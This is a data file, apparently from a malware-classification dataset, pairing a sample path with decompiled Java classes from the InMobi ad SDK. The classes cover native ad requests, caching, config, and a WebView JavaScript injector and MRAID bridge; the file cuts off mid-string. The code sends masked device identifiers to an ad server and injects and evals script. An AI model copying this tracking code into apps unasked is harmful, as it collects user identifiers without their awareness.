"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\LtvpRuleProcessor.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7e07311c"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\MonetizationUtils.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6f197a9f"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\NativeAdRequest.code","public class NativeAdRequest extends RequestBuilder {   private String a;   private String b=null;   private String c=null;   private String d=null;   private HashMap<String,String> e=null;   public NativeAdRequest(  String str){     try {       AppInfo.setAppId(str);       this.a=str;     }  catch (    Exception e) {       Log.internal(Constants.LOG_TAG,""Failed to init Native Ad request"",e);     }   }   public String getAppId(){     return this.a;   }   @Override protected String getUidMapPostBody(){     Long l;     HashMap hashMap=new HashMap();     try {       l=AnalyticsInitializer.getConfigParams().getLTVId();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""LTVID not available yet in configs"");       l=null;     }     if (l != null) {       hashMap.put(""LTVID"",l + """");     }     String num=Integer.toString(new Random().nextInt());     String uidMap=Initializer.getConfigParams().getUID().getUidMap(UserInfo.getInstance().getDeviceIDMask(),num,hashMap);     StringBuilder sb=new StringBuilder();     if (uidMap == null) {       return null;     }     sb.append(""u-id-map="");     sb.append(getURLEncoded(uidMap));     sb.append(""&u-id-key="");     sb.append(num);     sb.append(""&u-key-ver="");     sb.append(UIDHelper.getRSAKeyVersion());     String sb2=sb.toString();     try {       if (sb2.charAt(0) == '&') {         return sb2.substring(1);       }       return sb2;     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e2);       return sb2;     }   }   @Override protected String getAdFormatPostBody(){     StringBuilder sb=new StringBuilder();     sb.append(""format=native"");     sb.append(""&mk-ads="" + Initializer.getConfigParams().getNativeSdkConfigParams().getmFetchLimit());     return sb.toString();   }   @Override protected String getPublisherPostBody(){     StringBuilder sb=new StringBuilder();     if (this.e != null) {       for (      Map.Entry<String,String> entry : this.e.entrySet()) {         sb.append(""&"").append(getURLEncoded(entry.getKey().toString())).append(""="").append(getURLEncoded(entry.getValue().toString()));       }     }     if (this.c != null && this.d != null) {       sb.append(""&"").append(getURLEncoded(this.c)).append(""="").append(getURLEncoded(this.d));     }     if (this.b != null) {       sb.append(""&p-keywords="");       sb.append(getURLEncoded(this.b));     }     String sb2=sb.toString();     try {       if (sb2.charAt(0) == '&') {         return sb2.substring(1);       }       return sb2;     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e);       return sb2;     }   }   @Override public String buildPostBody(){     return super.buildPostBody();   }   public void setKeywords(  String str){     if (str != null && !"""".equals(str)) {       this.b=str;     }   }   public void setRefTagParam(  String str,  String str2){     if (str != null && !"""".equals(str) && str2 != null && !"""".equals(str2)) {       this.c=str;       this.d=str2;     }   }   public void setRequestParams(  Map<String,String> map){     if (map != null && !map.isEmpty()) {       if (this.e == null) {         this.e=new HashMap<>();       }       for (      String str : map.keySet()) {         this.e.put(str,map.get(str));       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\NativeAdRequestTask.code","public class NativeAdRequestTask implements Runnable {   private NativeAdRequest a;   private INativeAdController b;   private HttpURLConnection c;   public NativeAdRequestTask(  NativeAdRequest nativeAdRequest,  INativeAdController iNativeAdController){     this.a=nativeAdRequest;     this.b=iNativeAdController;   }   @Override public void run(){     try {       Log.debug(ConfigConstants.LOGGING_TAG,""Ad Serving URL: http://i.w.inmobi.com/showad.asm"");       Log.debug(ConfigConstants.LOGGING_TAG,""Post body:"" + this.a.buildPostBody());       this.c=a(""http://i.w.inmobi.com/showad.asm"");       b(this.a.buildPostBody());       a();     }  catch (    Exception e) {       if (this.b != null) {         this.b.onAdRequestFailed(this.a,IMErrorCode.NETWORK_ERROR);       }       Log.debug(Constants.LOG_TAG,""Failed to get native ads"",e);     }   }   private HttpURLConnection a(  String str) throws IOException {     HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(str).openConnection();     a(httpURLConnection);     return httpURLConnection;   }   private static void a(  HttpURLConnection httpURLConnection) throws ProtocolException {     int fetchTimeOut=Initializer.getConfigParams().getFetchTimeOut();     httpURLConnection.setConnectTimeout(fetchTimeOut);     httpURLConnection.setReadTimeout(fetchTimeOut);     httpURLConnection.setRequestProperty(""user-agent"",DeviceInfo.getPhoneDefaultUserAgent());     httpURLConnection.setUseCaches(false);     httpURLConnection.setDoOutput(true);     httpURLConnection.setDoInput(true);     httpURLConnection.setRequestMethod(""POST"");     httpURLConnection.setRequestProperty(""content-type"",""application/x-www-form-urlencoded"");   }   private void a(){     try {       Log.debug(ConfigConstants.LOGGING_TAG,""Http Status Code: "" + this.c.getResponseCode());       int responseCode=this.c.getResponseCode();       Log.debug(ConfigConstants.LOGGING_TAG,""Im Id: "" + this.c.getHeaderField(ConfigConstants.IMP_ID_KEY));       String headerField=this.c.getHeaderField(ConfigConstants.SANDBOX_ERR_KEY);       if (headerField != null) {         Log.debug(ConfigConstants.LOGGING_TAG,""Sandbox error Id: "" + headerField);       }       try {         if (responseCode == 200) {           BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(this.c.getInputStream(),""UTF-8""));           StringBuilder sb=new StringBuilder();           while (true) {             String readLine=bufferedReader.readLine();             if (readLine == null) {               break;             }  else {               sb.append(readLine);             }           }           JSONArray jSONArray=new JSONObject(sb.toString()).getJSONArray(NativeAdResponse.KEY_ADS);           if (jSONArray != null) {             if (jSONArray.length() == 0) {               Log.debug(ConfigConstants.LOGGING_TAG,""Server returned No Fill "");               if (this.b != null) {                 this.b.onAdRequestFailed(this.a,IMErrorCode.NO_FILL);               }             }  else {               ArrayList arrayList=new ArrayList();               int length=jSONArray.length();               int i=Initializer.getConfigParams().getNativeSdkConfigParams().getmFetchLimit();               if (length <= i) {                 i=length;               }               for (int i2=0; i2 < i; i2++) {                 try {                   JSONObject jSONObject=jSONArray.getJSONObject(i2);                   String optString=jSONObject.optString(NativeAdResponse.KEY_PUBCONTENT);                   String optString2=jSONObject.optString(NativeAdResponse.KEY_CONTEXTCODE);                   String optString3=jSONObject.optString(NativeAdResponse.KEY_NAMESPACE);                   if (optString != null && !"""".equals(optString.trim()) && optString2 != null && !"""".equals(optString2.trim()) && optString3 != null && !"""".equals(optString3.trim())) {                     arrayList.add(jSONObject.toString());                   }                 }  catch (                Exception e) {                   Log.internal(Constants.LOG_TAG,""JSON Exception"",e);                 }               }               if (this.b != null) {                 if (arrayList.size() > 0) {                   this.b.onAdRequestSucceded(this.a,new NativeAdResponse(arrayList));                 }  else {                   Log.debug(ConfigConstants.LOGGING_TAG,""Server Error"");                   this.b.onAdRequestFailed(this.a,IMErrorCode.INTERNAL_ERROR);                 }               }             }           }         }  else         if (responseCode == 400) {           Log.debug(ConfigConstants.LOGGING_TAG,""Invalid App Id.Please check the app Id in the adrequest is valid and in active state"");           if (this.b != null) {             this.b.onAdRequestFailed(this.a,IMErrorCode.INVALID_REQUEST);           }         }  else {           Log.debug(ConfigConstants.LOGGING_TAG,""Server Error"");           if (this.b != null) {             this.b.onAdRequestFailed(this.a,IMErrorCode.INTERNAL_ERROR);           }         }       }   finally {         this.c.disconnect();         a((Closeable)null);       }     }  catch (    Exception e2) {       Log.internal(Constants.LOG_TAG,""Failed to retrieve native ad"",e2);       if (this.b != null) {         this.b.onAdRequestFailed(this.a,IMErrorCode.INTERNAL_ERROR);       }     } catch (    OutOfMemoryError e3) {       Log.internal(Constants.LOG_TAG,""Out of memory error received while retieving ad"",e3);       if (this.b != null) {         this.b.onAdRequestFailed(this.a,IMErrorCode.INTERNAL_ERROR);       }     }   }   private void b(  String str) throws IOException {     BufferedWriter bufferedWriter;     this.c.setRequestProperty(""Content-Length"",Integer.toString(str.length()));     try {       bufferedWriter=new BufferedWriter(new OutputStreamWriter(this.c.getOutputStream()));     }  catch (    Throwable th) {       th=th;       bufferedWriter=null;     }     try {       bufferedWriter.write(str);       a(bufferedWriter);     }  catch (    Throwable th2) {       th=th2;       a(bufferedWriter);       throw th;     }   }   private void a(  Closeable closeable){     if (closeable != null) {       try {         closeable.close();       }  catch (      IOException e) {         Log.debug(ConfigConstants.LOGGING_TAG,""Exception closing resource: "" + closeable,e);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\NativeAdResponse.code","public class NativeAdResponse {   public static final String KEY_ADS=""ads"";   public static final String KEY_CONTEXTCODE=""contextCode"";   public static final String KEY_NAMESPACE=""namespace"";   public static final String KEY_PUBCONTENT=""pubContent"";   private List<String> a;   public NativeAdResponse(  List<String> list){     if (list != null) {       this.a=list;     }   }   public List<String> a(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\NativeAdsController.code","public class NativeAdsController implements INativeAdController {   private static NativeAdsController d=null;   private INativeAdListener b;   private boolean c=false;   private ServiceProvider a=ServiceProvider.getInstance();   private NativeAdsController(){   }   public static NativeAdsController getInstance(){     if (d == null) {       d=new NativeAdsController();     }     return d;   }   public void getAd(  String str,  NativeAdRequest nativeAdRequest,  INativeAdListener iNativeAdListener){     this.c=false;     this.b=iNativeAdListener;     IMNative cachedAd=NativeAdsCache.getInstance().getCachedAd(str);     int numCachedAds=NativeAdsCache.getInstance().getNumCachedAds(str);     int i=Initializer.getConfigParams().getNativeSdkConfigParams().getmMinLimit();     if (cachedAd == null) {       a(str,nativeAdRequest);       return;     }     if (numCachedAds < i) {       this.c=true;       a(str,nativeAdRequest);       if (this.b != null) {         this.b.onNativeRequestSucceeded(cachedAd);         return;       }       return;     }     this.c=true;     if (this.b != null) {       this.b.onNativeRequestSucceeded(cachedAd);     }   }   private void a(  String str,  NativeAdRequest nativeAdRequest){     if (InternalSDKUtil.checkNetworkAvailibility(InternalSDKUtil.getContext())) {       Log.internal(Constants.LOG_TAG,""Fetching Native Ads"");       this.a.getNativeAd(nativeAdRequest,this);     }  else {       onAdRequestFailed(nativeAdRequest,IMErrorCode.NETWORK_ERROR);     }   }   @Override public void onAdRequestSucceded(  NativeAdRequest nativeAdRequest,  NativeAdResponse nativeAdResponse){     Log.debug(Constants.LOG_TAG,""Native ad received: "");     NativeAdsCache.getInstance().saveNativeAds(nativeAdRequest.getAppId(),nativeAdResponse.a());     if (!this.c && this.b != null) {       this.c=true;       IMNative cachedAd=NativeAdsCache.getInstance().getCachedAd(nativeAdRequest.getAppId());       if (cachedAd != null) {         this.b.onNativeRequestSucceeded(cachedAd);       }  else {         this.b.onNativeRequestFailed(IMErrorCode.INTERNAL_ERROR);       }     }   }   @Override public void onAdRequestFailed(  NativeAdRequest nativeAdRequest,  IMErrorCode iMErrorCode){     Log.debug(Constants.LOG_TAG,""Native ad failed: "");     if (!this.c && this.b != null) {       this.c=true;       this.b.onNativeRequestFailed(iMErrorCode);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\ServiceProvider.code","public class ServiceProvider implements IServiceProvider {   private static ServiceProvider a;   private ExecutorService b=Executors.newFixedThreadPool(15);   private ServiceProvider(){   }   public static ServiceProvider getInstance(){     if (a == null) { synchronized (ServiceProvider.class) {         if (a == null) {           a=new ServiceProvider();         }       }     }     return a;   }   @Override public void getLtvpRule(  GetLtvpRulesRequest getLtvpRulesRequest,  IGetLtvpRuleRequestListener iGetLtvpRuleRequestListener){     this.b.execute(new GetLtvpRuleRequestTask(getLtvpRulesRequest,iGetLtvpRuleRequestListener));   }   @Override public void getNativeAd(  NativeAdRequest nativeAdRequest,  INativeAdController iNativeAdController){     this.b.execute(new NativeAdRequestTask(nativeAdRequest,iNativeAdController));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal\TrackerView.code","public class TrackerView extends View {   public static final int ID=999;   WebViewClient a;   private IMWebView b;   private boolean c;   private String d;   private ArrayList<String> e;   private boolean f;   public TrackerView(  Context context,  String str,  String str2){     super(context);     this.c=false;     this.e=null;     this.f=false;     this.a=new a(this);     if (str != null && str2 != null) {       this.d=str2;       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);       layoutParams.addRule(10);       setLayoutParams(layoutParams);       setBackgroundColor(0);       IMWebView.setIMAIController(IMAIController.class);       this.b=new IMWebView(context,null,false,false);       this.b.getSettings().setJavaScriptEnabled(true);       this.b.getSettings().setCacheMode(2);       this.b.setWebViewClient(this.a);       this.b.loadData(str,""text/html"",""UTF-8"");       this.e=new ArrayList<>();       setId(ID);     }   }   public void destroy(){     if (this.b != null) {       this.b.destroy();       this.b=null;     }     if (this.e != null) {       this.e.clear();       this.e=null;     }     this.c=false;     this.f=false;   }   @Override protected void onWindowVisibilityChanged(  int i){     super.onWindowVisibilityChanged(i);     if (i == 0 && !this.c) {       this.c=true;       if (this.f) {         handleImpression(a());       }  else       if (this.e != null) {         this.e.add(a());       }     }   }   private String a(){     return this.d + ""recordEvent(18)"";   }   private String a(  HashMap<String,String> hashMap){     StringBuilder sb=new StringBuilder();     if (hashMap == null || hashMap.isEmpty()) {       sb.append(this.d + ""recordEvent(8)"");       return sb.toString();     }     sb.append(this.d + ""recordEvent(8, "");     JSONObject jSONObject=new JSONObject();     UIDUtil.bindToJSON(hashMap,jSONObject);     sb.append(jSONObject.toString());     sb.append("")"");     return sb.toString();   }   public void handleImpression(  String str){     Log.debug(Constants.LOG_TAG,""Handle Impression"");     injectJavaScript(str);   }   public void click(  HashMap<String,String> hashMap){     Log.debug(Constants.LOG_TAG,""Handle Click"");     String a=a(hashMap);     if (this.f) {       injectJavaScript(a);     }  else     if (this.e != null) {       this.e.add(a);     }   }   public void injectJavaScript(  String str){     if (str != null) {       try {         if (str.length() < 400) {           Log.internal(Constants.LOG_TAG,str);         }         if (this.b != null) {           this.b.loadUrl(""javascript:try{"" + str + ""}catch(e){}"");         }       }  catch (      Exception e) {         e.printStackTrace();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal.abstraction\IGetLtvpRuleRequestListener.code","public interface IGetLtvpRuleRequestListener {   void onLtvpGetRuleFailed(  GetLtvpRulesRequest getLtvpRulesRequest,  LtvpErrorCode ltvpErrorCode);   void onLtvpGetRuleSucceeded(  GetLtvpRulesRequest getLtvpRulesRequest,  GetLtvpRulesResponse getLtvpRulesResponse); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal.abstraction\INativeAdController.code","public interface INativeAdController {   void onAdRequestFailed(  NativeAdRequest nativeAdRequest,  IMErrorCode iMErrorCode);   void onAdRequestSucceded(  NativeAdRequest nativeAdRequest,  NativeAdResponse nativeAdResponse); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal.abstraction\INativeAdListener.code","public interface INativeAdListener {   void onNativeRequestFailed(  IMErrorCode iMErrorCode);   void onNativeRequestSucceeded(  IMNative iMNative); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal.abstraction\IServiceProvider.code","public interface IServiceProvider {   void getLtvpRule(  GetLtvpRulesRequest getLtvpRulesRequest,  IGetLtvpRuleRequestListener iGetLtvpRuleRequestListener);   void getNativeAd(  NativeAdRequest nativeAdRequest,  INativeAdController iNativeAdController); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal.objects\LtvpRuleCache.code","public class LtvpRuleCache {   static LtvpRuleCache a;   private static String c=""IMAdMLtvpRuleCache"";   private static String d=""IMAdMLtvpRuleId"";   private static String e=""IMAdMLtvpHardExpiry"";   private static String f=""IMAdMLtvpSoftExpiry"";   private SharedPreferences b;   public static LtvpRuleCache getInstance(  Context context){     if (a == null) { synchronized (LtvpRuleCache.class) {         if (a == null) {           a=new LtvpRuleCache(context);         }       }     }     return a;   }   private LtvpRuleCache(  Context context){     this.b=null;     this.b=context.getSharedPreferences(c,0);   }   public void clearLtvpRuleCache(){     SharedPreferences.Editor edit=this.b.edit();     edit.clear();     edit.commit();   }   public void setLtvpRuleConfig(  GetLtvpRulesResponse getLtvpRulesResponse){     a(getLtvpRulesResponse.getRuleId());     a(getLtvpRulesResponse.getHardExpiry() + getLtvpRulesResponse.getTimeStamp());     b(getLtvpRulesResponse.getSoftExpiry() + getLtvpRulesResponse.getTimeStamp());     a(getLtvpRulesResponse.getRules());   }   private void a(  long j){     SharedPreferences.Editor edit=this.b.edit();     edit.putLong(e,j);     edit.commit();   }   private void b(  long j){     SharedPreferences.Editor edit=this.b.edit();     edit.putLong(f,j);     edit.commit();   }   private void a(  String str){     SharedPreferences.Editor edit=this.b.edit();     edit.putString(d,str);     edit.commit();   }   private void a(  HashMap<String,Integer> hashMap){     try {       SharedPreferences.Editor edit=this.b.edit();       for (      String str : hashMap.keySet()) {         edit.putInt(str,hashMap.get(str).intValue());       }       edit.commit();     }  catch (    Exception e2) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception saving rule map"",e2);     }   }   public long getSoftExpiryForLtvpRule(){     return this.b.getLong(f,0L);   }   public long getHardExpiryForLtvpRule(){     return this.b.getLong(e,0L);   }   public int getLtvpRule(  long j){     return this.b.getInt(String.valueOf(j),0);   }   public String getLtvpRuleId(){     return this.b.getString(d,"""");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal.objects\NativeAd.code","public class NativeAd extends IMNative {   String b;   String c;   String d;   TrackerView e;   public NativeAd(  String str,  String str2,  String str3){     super(str,str2,str3);     this.b=null;     this.c=null;     this.d=null;     this.e=null;     this.b=str;     this.c=str2;     this.d=str3;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.monetization.internal.objects\NativeAdsCache.code","public class NativeAdsCache {   static NativeAdsCache a;   public static NativeAdsCache getInstance(){     if (a == null) { synchronized (NativeAdsCache.class) {         a=new NativeAdsCache(InternalSDKUtil.getContext());       }     }     AdDatabaseManager.getInstance().setDBLimit(Initializer.getConfigParams().getNativeSdkConfigParams().getmMaxCacheSize());     return a;   }   private NativeAdsCache(  Context context){   }   public IMNative getCachedAd(  String str){     try {       JSONObject jSONObject=new JSONObject(AdDatabaseManager.getInstance().getAd(str).getContent());       return new NativeAd(new String(Base64.decode(jSONObject.getString(NativeAdResponse.KEY_PUBCONTENT),0)).trim(),jSONObject.getString(NativeAdResponse.KEY_CONTEXTCODE),jSONObject.getString(NativeAdResponse.KEY_NAMESPACE));     }  catch (    Exception e) {       Log.internal(Constants.LOG_TAG,""Exception getting cached ad"",e);       return null;     }   }   public int getNumCachedAds(  String str){     try {       return AdDatabaseManager.getInstance().getNoOfAds(str);     }  catch (    Exception e) {       return 0;     }   }   public void saveNativeAds(  String str,  List<String> list){     if (list != null && list.size() > 0) {       int i=0;       while (true) {         int i2=i;         if (i2 < list.size()) {           AdData adData=new AdData();           adData.setContent(list.get(i2));           adData.setTimestamp(System.currentTimeMillis());           adData.setAppId(str);           adData.setAdType(""native"");           AdDatabaseManager.getInstance().insertAd(adData);           i=i2 + 1;         }  else {           return;         }       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.configs\a.code","class a implements CacheController.Validator {   @Override public boolean validate(  Map<String,Object> map){     return Initializer.a(map);   } } static class a implements CacheController.Validator {   a(){   }   @Override public boolean validate(  Map<String,Object> map){     return map.get(""data"") != null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.configs\ConfigParams.code","public class ConfigParams {   String a=""#00000000"";   int b=320;   int c=480;   int d=100;   public int getPicWidth(){     return this.b;   }   public int getPicHeight(){     return this.c;   }   public int getPicQuality(){     return this.d;   }   public int getWebviewBgColor(){     try {       return Color.parseColor(this.a);     }  catch (    Exception e) {       Log.internal(Constants.RENDERING_LOG_TAG,""Invalid bg color. Reverting to default"",e);       return Color.parseColor(""#00000000"");     }   }   public UID getUID(){     return UID.getCommonsUid();   }   public void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getStringFromMap(map,""wthc"");     this.c=InternalSDKUtil.getIntFromMap(map,""picH"",1,2147483647L);     this.b=InternalSDKUtil.getIntFromMap(map,""picW"",1,2147483647L);     this.d=InternalSDKUtil.getIntFromMap(map,""picA"",1,100L);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.configs\Initializer.code","public class Initializer {   public static final String PRODUCT_MRAID=""mraid"";   public static final String PRODUCT_RENDERING=""rendering"";   private static Context a=null;   private static Map<String,String> b=new HashMap();   private static ConfigParams c=new ConfigParams();   private static CacheController.Validator d=new com.inmobi.re.configs.a();   public static ConfigParams getConfigParams(){     if (InternalSDKUtil.getContext() != null && InMobi.getAppId() != null) {       b(InternalSDKUtil.getContext());     }     return c;   }   private static void a(  Context context){     if (context != null && a == null) {       if (a == null) {         a=context;         c(context);         try {           a(CacheController.getConfig(PRODUCT_RENDERING,context,b,d).getData());           return;         }  catch (        Exception e) {           return;         }       }       return;     }     if (a == null && context == null) {       throw new NullPointerException();     }   }   private static void b(  Context context){     a(context);     try {       CacheController.getConfig(PRODUCT_RENDERING,context,b,d);     }  catch (    Exception e) {     }   }   private static void c(  Context context){     b=UIDUtil.getMap(a,c.getUID());   }   public static boolean a(  Map<String,Object> map){     c(a);     try {       Map<String,Object> populateToNewMap=InternalSDKUtil.populateToNewMap((Map)map.get(""AND""),(Map)map.get(""common""),true);       ConfigParams configParams=new ConfigParams();       configParams.setFromMap(populateToNewMap);       c=configParams;       return true;     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Config couldn't be parsed"",e);       return false;     }   } static class a implements CacheController.Validator {     a(){     }     @Override public boolean validate(    Map<String,Object> map){       return map.get(""data"") != null;     }   }   public static String getMRAIDString(){     String rawData;     try {       rawData=CacheController.getConfig(PRODUCT_MRAID,a,b,new a()).getRawData();     }  catch (    Exception e) {     }     return (rawData == null || rawData == """") ? ""var imIsObjValid=function(a){return\""undefined\""!=typeof a&&null!=a?!0:!1},imIsObjInvalid=function(a){return\""undefined\""==typeof a||null==a?!0:!1},EventListeners=function(a){this.event=a;this.count=0;var b={};this.add=function(a){var e=String(a);b[e]||(b[e]=a,this.count++)};this.remove=function(a){a=String(a);return b[a]?(b[a]=null,delete b[a],this.count--,!0):!1};this.removeAll=function(){for(var a in b)this.remove(b[a])};this.broadcast=function(a){for(var e in b)b[e].apply({},a)};this.toString=function(){var c=[a,\"":\""],e;for(e in b)c.push(\""|\"",e,\""|\"");return c.join(\""\"")}},InmobiObj=function(){this.listeners=[];this.addEventListener=function(a,b){try{if(imIsObjValid(b)&&imIsObjValid(a)){var c=this.listeners;c[a]||(c[a]=new EventListeners);c[a].add(b);\""micIntensityChange\""==a&&window.mraidview.startListeningMicIntensity()}}catch(e){this.log(e)}};this.removeEventListener=function(a,b){if(imIsObjValid(a)){var c=this.listeners;imIsObjValid(c[a])&&(imIsObjValid(b)?c[a].remove(b):c[a].removeAll());\""micIntensityChange\""==a&&0==c[a].count&&window.mraidview.stopListeningMicIntensity()}};this.broadcastEvent=function(a){if(imIsObjValid(a)){for(var b=Array(arguments.length),c=0;c<arguments.length;c++)b[c]=arguments[c];c=b.shift();try{this.listeners[c]&&this.listeners[c].broadcast(b)}catch(e){}}}},__im__iosNativeCall={nativeCallInFlight:!1,nativeCallQueue:[],executeNativeCall:function(a){this.nativeCallInFlight?this.nativeCallQueue.push(a):(this.nativeCallInFlight=!0,window.location=a)},nativeCallComplete:function(a){0==this.nativeCallQueue.length?this.nativeCallInFlight=!1:(a=this.nativeCallQueue.shift(),window.location=a)}},IOSNativeCall=function(){this.urlScheme=\""\"";this.executeNativeCall=function(a){for(var b=this.urlScheme+\""://\""+a,c,e=!0,g=1;g<arguments.length;g+=2)c=arguments[g+1],null!=c&&(e?(b+=\""?\"",e=!1):b+=\""&\"",b+=arguments[g]+\""=\""+escape(c));__im__iosNativeCall.executeNativeCall(b);return\""OK\""};this.nativeCallComplete=function(a){__im__iosNativeCall.nativeCallComplete(a);return\""OK\""}};(function(){var a=window.mraidview={},b={allowOrientationChange:!0,forceOrientation:\""none\""},c=[],e=!1;a.fireGalleryImageSelectedEvent=function(a,d,b){var c=new Image;c.src=\""data:image/jpeg;base64,\""+a;c.width=d;c.height=b;window.mraid.broadcastEvent(\""galleryImageSelected\"",c);return\""OK\""};a.fireCameraPictureCatpturedEvent=function(a,d,b){var c=new Image;c.src=\""data:image/jpeg;base64,\""+a;c.width=d;c.height=b;window.mraid.broadcastEvent(\""cameraPictureCaptured\"",c);return\""OK\""};a.firePostStatusEvent=function(a){window.mraid.broadcastEvent(\""postStatus\"",a);return\""OK\""};a.fireMediaTrackingEvent=function(a,d){var b={};b.name=a;var c=\""inmobi_media_\""+a;\""undefined\""!=typeof d&&(null!=d&&\""\""!=d)&&(c=c+\""_\""+d);window.mraid.broadcastEvent(c,b);return\""OK\""};a.fireMediaErrorEvent=function(a,d){var b={name:\""error\""};b.code=d;var c=\""inmobi_media_\""+b.name;\""undefined\""!=typeof a&&(null!=a&&\""\""!=a)&&(c=c+\""_\""+a);window.mraid.broadcastEvent(c,b);return\""OK\""};a.fireMediaTimeUpdateEvent=function(a,d,b){var c={name:\""timeupdate\"",target:{}};c.target.currentTime=d;c.target.duration=b;d=\""inmobi_media_\""+c.name;\""undefined\""!=typeof a&&(null!=a&&\""\""!=a)&&(d=d+\""_\""+a);window.mraid.broadcastEvent(d,c);return\""OK\""};a.fireMediaCloseEvent=function(a,d,b){var c={name:\""close\""};c.viaUserInteraction=d;c.target={};c.target.currentTime=b;d=\""inmobi_media_\""+c.name;\""undefined\""!=typeof a&&(null!=a&&\""\""!=a)&&(d=d+\""_\""+a);window.mraid.broadcastEvent(d,c);return\""OK\""};a.fireMediaVolumeChangeEvent=function(a,d,b){var c={name:\""volumechange\"",target:{}};c.target.volume=d;c.target.muted=b;d=\""inmobi_media_\""+c.name;\""undefined\""!=typeof a&&(null!=a&&\""\""!=a)&&(d=d+\""_\""+a);window.mraid.broadcastEvent(d,c);return\""OK\""};a.showAlert=function(a){utilityController.showAlert(a)};a.zeroPad=function(a){var d=\""\"";10>a&&(d+=\""0\"");return d+a};a.useCustomClose=function(f){try{displayController.useCustomClose(f)}catch(d){a.showAlert(\""use CustomClose: \""+d)}};a.close=function(){try{displayController.close()}catch(f){a.showAlert(\""close: \""+f)}};a.stackCommands=function(a,d){e?c.push(a):(eval(a),d&&(e=!0))};a.executeStack=function(){for(e=!1;0<c.length;){var a=c.shift();eval(a)}};a.emptyStack=function(){for(;0<c.length;)c.shift()};a.expand=function(f){try{displayController.expand(f)}catch(d){a.showAlert(\""executeNativeExpand: \""+d+\"", URL = \""+f)}};a.setExpandProperties=function(f){try{f?this.props=f:f=null,displayController.setExpandProperties(a.stringify(f))}catch(d){a.showAlert(\""executeNativesetExpandProperties: \""+d+\"", props = \""+f)}};a.getExpandProperties=function(){try{return eval(\""(\""+displayController.getExpandProperties()+\"")\"")}catch(f){a.showAlert(\""getExpandProperties: \""+f)}};a.setOrientationProperties=function(f){try{f?b=f:f=null,displayController.setOrientationProperties(a.stringify(f))}catch(d){a.showAlert(\""executeNativesetOrientationProperties: \""+d+\"", props = \""+f)}};a.getOrientationProperties=function(){return b};a.resizeProps=null;a.setResizeProperties=function(f){var d,b;try{d=parseInt(f.width);b=parseInt(f.height);if(isNaN(d)||isNaN(b)||1>d||1>b)throw\""Invalid\"";f.width=d;f.height=b;a.resizeProps=f;displayController.setResizeProperties(a.stringify(f))}catch(c){window.mraid.broadcastEvent(\""error\"",\""Invalid properties.\"",\""setResizeProperties\"")}};a.acceptAction=function(f){try{displayController.acceptAction(a.stringify(f))}catch(d){a.showAlert(\""acceptAction: \""+d+\"", params = \""+f)}};a.rejectAction=function(f){try{displayController.rejectAction(a.stringify(f))}catch(d){a.showAlert(\""rejectAction: \""+d+\"", params = \""+f)}};a.open=function(f){\""undefined\""==typeof f&&(f=null);try{displayController.open(f)}catch(d){a.showAlert(\""open: \""+d)}};a.openExternal=function(f){try{utilityController.openExternal(f)}catch(d){a.showAlert(\""openExternal: \""+d)}};a.getScreenSize=function(){try{return eval(\""(\""+utilityController.getScreenSize()+\"")\"")}catch(f){a.showAlert(\""getScreenSize: \""+f)}};a.getMaxSize=function(){try{return eval(\""(\""+utilityController.getMaxSize()+\"")\"")}catch(f){a.showAlert(\""getMaxSize: \""+f)}};a.getCurrentPosition=function(){try{return 